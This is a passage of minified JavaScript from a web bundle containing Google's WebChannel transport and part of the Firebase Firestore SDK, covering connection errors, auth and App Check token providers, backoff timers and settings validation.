$c(l){l.C!=null&&(a.clearTimeout(l.C),l.C=null)}function T0(l,m){var g=null;if(l.g==m){$c(l),yf(l),l.g=null;var I=2}else if(ff(l.h,m))g=m.D,i0(l.h,m),I=1;else return;if(l.G!=0){if(m.o)if(I==1){g=m.m?m.m.length:0,m=Date.now()-m.F;var M=l.B;I=of(),$e(I,new Yy(I,g)),Uc(l)}else S0(l);else if(M=m.s,M==3||M==0&&0<m.X||!(I==1&&kk(l,m)||I==2&&vf(l)))switch(g&&0<g.length&&(m=l.h,m.i=m.i.concat(g)),M){case 1:rs(l,5);break;case 4:rs(l,10);break;case 3:rs(l,6);break;default:rs(l,2)}}}function I0(l,m){let g=l.Ta+Math.floor(Math.random()*l.cb);return l.isActive()||(g*=2),g*m}function rs(l,m){if(l.j.info("Error code "+m),m==2){var g=h(l.fb,l),I=l.Xa;const M=!I;I=new ns(I||"//www.google.com/images/cleardot.gif"),a.location&&a.location.protocol=="http"||Ac(I,"https"),Dc(I),M?Ek(I.toString(),g):Ck(I.toString(),g)}else bt(2);l.G=0,l.l&&l.l.sa(m),N0(l),x0(l)}t.fb=function(l){l?(this.j.info("Successfully pinged google.com"),bt(2)):(this.j.info("Failed to ping google.com"),bt(1))};function N0(l){if(l.G=0,l.ka=[],l.l){const m=s0(l.h);(m.length!=0||l.i.length!=0)&&(C(l.ka,m),C(l.ka,l.i),l.h.i.length=0,y(l.i),l.i.length=0),l.l.ra()}}function k0(l,m,g){var I=g instanceof ns?hr(g):new ns(g);if(I.g!="")m&&(I.g=m+"."+I.g),Oc(I,I.s);else{var M=a.location;I=M.protocol,m=m?m+"."+M.hostname:M.hostname,M=+M.port;var F=new ns(null);I&&Ac(F,I),m&&(F.g=m),M&&Oc(F,M),g&&(F.l=g),I=F}return g=l.D,m=l.ya,g&&m&&Ae(I,g,m),Ae(I,"VER",l.la),Ra(l,I),I}function P0(l,m,g){if(m&&!l.J)throw Error("Can't create secondary domain capable XhrIo object.");return m=l.Ca&&!l.pa?new Ke(new jc({eb:g})):new Ke(l.pa),m.Ha(l.J),m}t.isActive=function(){return!!this.l&&this.l.isActive(this)};function R0(){}t=R0.prototype,t.ua=function(){},t.ta=function(){},t.sa=function(){},t.ra=function(){},t.isActive=function(){return!0},t.Na=function(){};function ln(l,m){Ye.call(this),this.g=new w0(m),this.l=l,this.h=m&&m.messageUrlParams||null,l=m&&m.messageHeaders||null,m&&m.clientProtocolHeaderRequired&&(l?l["X-Client-Protocol"]="webchannel":l={"X-Client-Protocol":"webchannel"}),this.g.o=l,l=m&&m.initMessageHeaders||null,m&&m.messageContentType&&(l?l["X-WebChannel-Content-Type"]=m.messageContentType:l={"X-WebChannel-Content-Type":m.messageContentType}),m&&m.va&&(l?l["X-WebChannel-Client-Profile"]=m.va:l={"X-WebChannel-Client-Profile":m.va}),this.g.S=l,(l=m&&m.Sb)&&!w(l)&&(this.g.m=l),this.v=m&&m.supportsCrossDomainXhr||!1,this.u=m&&m.sendRawJson||!1,(m=m&&m.httpSessionIdParam)&&!w(m)&&(this.g.D=m,l=this.h,l!==null&&m in l&&(l=this.h,m in l&&delete l[m])),this.j=new $s(this)}_(ln,Ye),ln.prototype.m=function(){this.g.l=this.j,this.v&&(this.g.J=!0),this.g.connect(this.l,this.h||void 0)},ln.prototype.close=function(){gf(this.g)},ln.prototype.o=function(l){var m=this.g;if(typeof l=="string"){var g={};g.__data__=l,l=g}else this.u&&(g={},g.__data__=es(l),l=g);m.i.push(new hk(m.Ya++,l)),m.G==3&&Uc(m)},ln.prototype.N=function(){this.g.l=null,delete this.j,gf(this.g),delete this.g,ln.aa.N.call(this)};function A0(l){Mt.call(this),l.__headers__&&(this.headers=l.__headers__,this.statusCode=l.__status__,delete l.__headers__,delete l.__status__);var m=l.__sm__;if(m){e:{for(const g in m){l=g;break e}l=void 0}(this.i=l)&&(l=this.i,m=m!==null&&l in m?m[l]:void 0),this.data=m}else this.data=l}_(A0,Mt);function O0(){Br.call(this),this.status=1}_(O0,Br);function $s(l){this.g=l}_($s,R0),$s.prototype.ua=function(){$e(this.g,"a")},$s.prototype.ta=function(l){$e(this.g,new A0(l))},$s.prototype.sa=function(l){$e(this.g,new O0)},$s.prototype.ra=function(){$e(this.g,"b")},ln.prototype.send=ln.prototype.o,ln.prototype.open=ln.prototype.m,ln.prototype.close=ln.prototype.close,af.NO_ERROR=0,af.TIMEOUT=8,af.HTTP_ERROR=6,uk.COMPLETE="complete",Ce.EventType=mt,mt.OPEN="a",mt.CLOSE="b",mt.ERROR="c",mt.MESSAGE="d",Ye.prototype.listen=Ye.prototype.K,Ke.prototype.listenOnce=Ke.prototype.L,Ke.prototype.getLastError=Ke.prototype.Ka,Ke.prototype.getLastErrorCode=Ke.prototype.Ba,Ke.prototype.getStatus=Ke.prototype.Z,Ke.prototype.getResponseJson=Ke.prototype.Oa,Ke.prototype.getResponseText=Ke.prototype.oa,Ke.prototype.send=Ke.prototype.ea,Ke.prototype.setWithCredentials=Ke.prototype.Ha}).apply(typeof du<"u"?du:typeof self<"u"?self:typeof window<"u"?window:{});const Kw="@firebase/firestore",Gw="4.7.10";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nt{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}Nt.UNAUTHENTICATED=new Nt(null),Nt.GOOGLE_CREDENTIALS=new Nt("google-credentials-uid"),Nt.FIRST_PARTY=new Nt("first-party-uid"),Nt.MOCK_USER=new Nt("mock-user");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let _c="11.5.0";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $o=new bh("@firebase/firestore");function Pn(t,...e){if($o.logLevel<=_e.DEBUG){const n=e.map(Fv);$o.debug(`Firestore (${_c}): ${t}`,...n)}}function jb(t,...e){if($o.logLevel<=_e.ERROR){const n=e.map(Fv);$o.error(`Firestore (${_c}): ${t}`,...n)}}function U4(t,...e){if($o.logLevel<=_e.WARN){const n=e.map(Fv);$o.warn(`Firestore (${_c}): ${t}`,...n)}}function Fv(t){if(typeof t=="string")return t;try{/**
* @license
* Copyright 2020 Google LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/return function(n){return JSON.stringify(n)}(t)}catch{return t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Uv(t="Unexpected state"){const e=`FIRESTORE (${_c}) INTERNAL ASSERTION FAILED: `+t;throw jb(e),new Error(e)}function cl(t,e){t||Uv()}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $t={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class zt extends sr{constructor(e,n){super(e,n),this.code=e,this.message=n,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ul{constructor(){this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Mb{constructor(e,n){this.user=n,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class $4{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,n){e.enqueueRetryable(()=>n(Nt.UNAUTHENTICATED))}shutdown(){}}class z4{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,n){this.changeListener=n,e.enqueueRetryable(()=>n(this.token.user))}shutdown(){this.changeListener=null}}class B4{constructor(e){this.t=e,this.currentUser=Nt.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,n){cl(this.o===void 0);let r=this.i;const i=c=>this.i!==r?(r=this.i,n(c)):Promise.resolve();let s=new ul;this.o=()=>{this.i++,this.currentUser=this.u(),s.resolve(),s=new ul,e.enqueueRetryable(()=>i(this.currentUser))};const o=()=>{const c=s;e.enqueueRetryable(async()=>{await c.promise,await i(this.currentUser)})},a=c=>{Pn("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=c,this.o&&(this.auth.addAuthTokenListener(this.o),o())};this.t.onInit(c=>a(c)),setTimeout(()=>{if(!this.auth){const c=this.t.getImmediate({optional:!0});c?a(c):(Pn("FirebaseAuthCredentialsProvider","Auth not yet detected"),s.resolve(),s=new ul)}},0),o()}getToken(){const e=this.i,n=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(n).then(r=>this.i!==e?(Pn("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):r?(cl(typeof r.accessToken=="string"),new Mb(r.accessToken,this.currentUser)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){const e=this.auth&&this.auth.getUid();return cl(e===null||typeof e=="string"),new Nt(e)}}class V4{constructor(e,n,r){this.l=e,this.h=n,this.P=r,this.type="FirstParty",this.user=Nt.FIRST_PARTY,this.T=new Map}I(){return this.P?this.P():null}get headers(){this.T.set("X-Goog-AuthUser",this.l);const e=this.I();return e&&this.T.set("Authorization",e),this.h&&this.T.set("X-Goog-Iam-Authorization-Token",this.h),this.T}}class H4{constructor(e,n,r){this.l=e,this.h=n,this.P=r}getToken(){return Promise.resolve(new V4(this.l,this.h,this.P))}start(e,n){e.enqueueRetryable(()=>n(Nt.FIRST_PARTY))}shutdown(){}invalidateToken(){}}class qw{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class W4{constructor(e,n){this.A=n,this.forceRefresh=!1,this.appCheck=null,this.R=null,this.V=null,Ut(e)&&e.settings.appCheckToken&&(this.V=e.settings.appCheckToken)}start(e,n){cl(this.o===void 0);const r=s=>{s.error!=null&&Pn("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${s.error.message}`);const o=s.token!==this.R;return this.R=s.token,Pn("FirebaseAppCheckTokenProvider",`Received ${o?"new":"existing"} token.`),o?n(s.token):Promise.resolve()};this.o=s=>{e.enqueueRetryable(()=>r(s))};const i=s=>{Pn("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=s,this.o&&this.appCheck.addTokenListener(this.o)};this.A.onInit(s=>i(s)),setTimeout(()=>{if(!this.appCheck){const s=this.A.getImmediate({optional:!0});s?i(s):Pn("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}},0)}getToken(){if(this.V)return Promise.resolve(new qw(this.V));const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then(n=>n?(cl(typeof n.token=="string"),this.R=n.token,new qw(n.token)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}}function K4(t){return t.name==="IndexedDbTransactionError"}const Bm="(default)";class Ad{constructor(e,n){this.projectId=e,this.database=n||Bm}static empty(){return new Ad("","")}get isDefaultDatabase(){return this.database===Bm}isEqual(e){return e instanceof Ad&&e.projectId===this.projectId&&e.database===this.database}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var Yw,he;(he=Yw||(Yw={}))[he.OK=0]="OK",he[he.CANCELLED=1]="CANCELLED",he[he.UNKNOWN=2]="UNKNOWN",he[he.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",he[he.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",he[he.NOT_FOUND=5]="NOT_FOUND",he[he.ALREADY_EXISTS=6]="ALREADY_EXISTS",he[he.PERMISSION_DENIED=7]="PERMISSION_DENIED",he[he.UNAUTHENTICATED=16]="UNAUTHENTICATED",he[he.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",he[he.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",he[he.ABORTED=10]="ABORTED",he[he.OUT_OF_RANGE=11]="OUT_OF_RANGE",he[he.UNIMPLEMENTED=12]="UNIMPLEMENTED",he[he.INTERNAL=13]="INTERNAL",he[he.UNAVAILABLE=14]="UNAVAILABLE",he[he.DATA_LOSS=15]="DATA_LOSS";/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */new Db([4294967295,4294967295],0);/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const G4=41943040;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const q4=1048576;function op(){return typeof document<"u"?document:null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Y4{constructor(e,n,r=1e3,i=1.5,s=6e4){this.Ti=e,this.timerId=n,this.Go=r,this.zo=i,this.jo=s,this.Ho=0,this.Jo=null,this.Yo=Date.now(),this.reset()}reset(){this.Ho=0}Zo(){this.Ho=this.jo}Xo(e){this.cancel();const n=Math.floor(this.Ho+this.e_()),r=Math.max(0,Date.now()-this.Yo),i=Math.max(0,n-r);i>0&&Pn("ExponentialBackoff",`Backing off for ${i} ms (base delay: ${this.Ho} ms, delay with jitter: ${n} ms, last attempt: ${r} ms ago)`),this.Jo=this.Ti.enqueueAfterDelay(this.timerId,i,()=>(this.Yo=Date.now(),e())),this.Ho*=this.zo,this.Ho<this.Go&&(this.Ho=this.Go),this.Ho>this.jo&&(this.Ho=this.jo)}t_(){this.Jo!==null&&(this.Jo.skipDelay(),this.Jo=null)}cancel(){this.Jo!==null&&(this.Jo.cancel(),this.Jo=null)}e_(){return(Math.random()-.5)*this.Ho}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class $v{constructor(e,n,r,i,s){this.asyncQueue=e,this.timerId=n,this.targetTimeMs=r,this.op=i,this.removalCallback=s,this.deferred=new ul,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch(o=>{})}get promise(){return this.deferred.promise}static createAndSchedule(e,n,r,i,s){const o=Date.now()+r,a=new $v(e,n,o,i,s);return a.start(r),a}start(e){this.timerHandle=setTimeout(()=>this.handleDelayElapsed(),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new zt($t.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget(()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then(e=>this.deferred.resolve(e))):Promise.resolve())}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}var Qw,Xw;(Xw=Qw||(Qw={}))._a="default",Xw.Cache="cache";/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Q4(t){const e={};return t.timeoutSeconds!==void 0&&(e.timeoutSeconds=t.timeoutSeconds),e}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Jw=new Map;function X4(t,e,n,r){if(e===!0&&r===!0)throw new zt($t.INVALID_ARGUMENT,`${t} and ${n} cannot be used together.`)}function J4(t){if(t===void 0)return"undefined";if(t===null)return"null";if(typeof t=="string")return t.length>20&&(t=`${t.substring(0,20)}...`),JSON.stringify(t);if(typeof t=="number"||typeof t=="boolean")return""+t;if(typeof t=="object"){if(t instanceof Array)return"an array";{const e=function(r){return r.constructor?r.constructor.name:null}(t);return e?`a custom ${e} object`:"an object"}}return typeof t=="function"?"a function":Uv()}function Z4(t,e){if("_delegate"in t&&(t=t._delegate),!(t instanceof e)){if(e.name===t.constructor.name)throw new zt($t.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const n=J4(t);throw new zt($t.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${n}`)}}return t}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Lb="firestore.googleapis.com",Zw=!0;class ex{constructor(e){var n,r;if(e.host===void 0){if(e.ssl!==void 0)throw new zt($t.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host=Lb,this.ssl=Zw}else this.host=e.host,this.ssl=(n=e.ssl)!==null&&n!==void 0?n:Zw;if(this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=G4;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<q4)throw new zt($t.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}X4("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=Q4((r=e.experimentalLongPollingOptions)!==null&&r!==void 0?r:{}),function(s){if(s.timeoutSeconds!==void 0){if(isNaN(s.timeoutSeconds))throw new zt($t.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (must not be NaN)`);if(s.timeoutSeconds<5)throw new zt($t.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (minimum allowed value is 5)`);if(s.timeoutSeconds>30)throw new zt($t.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (maximum allowed value is 30)`)}}(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&function(r,i){return r.timeoutSeconds===i.timeoutSeconds}(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}class Fb{constructor(e,n,r,i){this._authCredentials=e,this._appCheckCredentials=n,this._databaseId=r,this._app=i,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new ex({}),this._settingsFrozen=!1,this._emulatorOptions={},this._terminateTask="notTerminated"}get app(){if(!this._app)throw new zt($t.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new zt($t.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new ex(e),this._emulatorOptions=e.emulatorOptions||{},e.credentials!==void 0&&(this._authCredentials=function(r){if(!r)return new $4;switch(r.type){case"firstParty":return new H4(r.sessionIndex||"0",r.iamToken||null,r.authTokenFactory||null);case"provider":return r.client;default:throw new zt($t.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}}(e.credentials))}_getSettings(){return this._settings}_getEmulatorOptions(){return this._emulatorOptions}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}async _restart(){this._terminateTask==="notTerminated"?await this._terminate():this._terminateTask="notTerminated"}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return function(n){const r=Jw.get(n);r&&(Pn("ComponentProvider","Removing Datastore"),Jw.delete(n),r.terminate())}(this),Promise.resolve()}}function eF(t,e,n,r={}){var i;const s=(t=Z4(t,Fb))._getSettings(),o=Object.assign(Object.assign({},s),{emulatorOptions:t._getEmulatorOptions()}),a=`${e}:${n}`;s.host!==Lb&&s.host!==a&&U4("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used.");const c=Object.assign(Object.assign({},s),{host:a,ssl:!1,emulatorOptions:r});if(!Mi(c,o)&&(t._setSettings(c),r.mockUserToken)){let u,p;if(typeof r.mockUserToken=="string")u=r.mockUserToken,p=Nt.MOCK_USER;else{u=Iv(r.mockUserToken,(i=t._app)===null||i===void 0?void 0:i.options.projectId);const f=r.mockUserToken.sub||r.mockUserToken.user_id;if(!f)throw new zt($t.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");p=new Nt(f)}t._authCredentials=new z4(new Mb(u,p))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const tx="AsyncQueue";class nx{constructor(e=Promise.resolve()){this.Vu=[],this.mu=!1,this.fu=[],this.gu=null,this.pu=!1,this.yu=!1,this.wu=[],this.a_=new Y4(this,"async_queue_retry"),this.Su=()=>{const r=op();r&&Pn(tx,"Visibility state changed to "+r.visibilityState),this.a_.t_()},this.bu=e;const n=op();n&&typeof n.addEventListener=="function"&&n.addEventListener("visibilitychange",this.Su)}get isShuttingDown(){return this.mu}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.Du(),this.vu(e)}enterRestrictedMode(e){if(!this.mu){this.mu=!0,this.yu=e||!1;const n=op();n&&typeof n.removeEventListener=="function"&&n.removeEventListener("visibilitychange",this.Su)}}enqueue(e){if(this.Du(),this.mu)return new Promise(()=>{});const n=new ul;return this.vu(()=>this.mu&&this.yu?Promise.resolve():(e().then(n.resolve,n.reject),n.promise)).then(()=>n.promise)}enqueueRetryable(e){this.enqueueAndForget(()=>(this.Vu.push(e),this.Cu()))}async Cu(){if(this.Vu.length!==0){try{await this.Vu[0](),this.Vu.shift(),this.a_.reset()}catch(e){if(!K4(e))throw e;Pn(tx,"Operation failed with retryable error: "+e)}this.Vu.length>0&&this.a_.Xo(()=>this.Cu())}}vu(e){const n=this.bu.then(()=>(this.pu=!0,e().catch(r=>{this.gu=r,this.pu=!1;const i=function(o){let a=o.message||"";return o.stack&&(a=o.stack.includes(o.message)?o.stack:o.message+`
